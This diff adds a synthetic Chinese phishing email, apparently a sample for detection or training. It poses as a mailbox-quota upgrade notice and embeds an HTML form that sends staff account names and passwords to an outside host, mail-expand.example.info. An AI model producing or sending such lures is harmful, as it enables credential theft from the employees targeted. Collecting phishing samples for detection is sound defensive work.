@@ -1,0 +1,9 @@
+From: =?utf-8?B?6YKu566x5pyN5Yqh?= <quota@mail-admin.example>
+To: staff@corp.internal
+Date: Thu, 27 Aug 2026 09:33:00 +0800
+Message-ID: <0018-b4@synth.example>
+Subject: 容量升级申请（需验证）
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>申请邮箱容量升级到 20G，请验证域账号：</p><form action='https://mail-expand.example.info/apply'><input name='account' placeholder='邮箱账号'><input type='password' name='pwd' placeholder='密码'><button>提交申请</button></form></body></html>
